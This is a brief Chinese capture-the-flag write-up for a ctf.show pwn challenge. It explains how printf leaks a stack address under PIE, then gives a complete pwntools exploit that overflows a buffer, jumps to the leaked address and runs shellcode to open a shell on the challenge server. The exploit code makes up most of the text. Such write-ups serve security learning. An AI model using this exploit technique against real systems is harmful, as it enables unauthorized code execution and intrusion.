# 挑战简介
输出了什么？

# 思路
printf,格式化字符串得代表;由于开启了pie，所以地址随机，因此printf输出的内容至关重要  

可以知道，这里%p输出得是v5得地址，因此payload得构造可以为“栈溢出+v5得地址+payload”  

```
from pwn import *
from LibcSearcher import *
context.log_level = "debug"

context(os='linux', arch='amd64', log_level='debug')

p = remote("pwn.challenge.ctf.show",28157)
elf = ELF('D:\edge 下载\pwn')
    
shellcode = asm(shellcraft.sh())

p.recvuntil("What's this : [")
	
v5=int(p.recv(14),16)

print("v5:",hex(v5))

p.recvuntil("But how to use it?\n")

payload = b"a" * 24 + p64(v5 + 32) + shellcode

p.sendline(payload)

p.interactive()

```
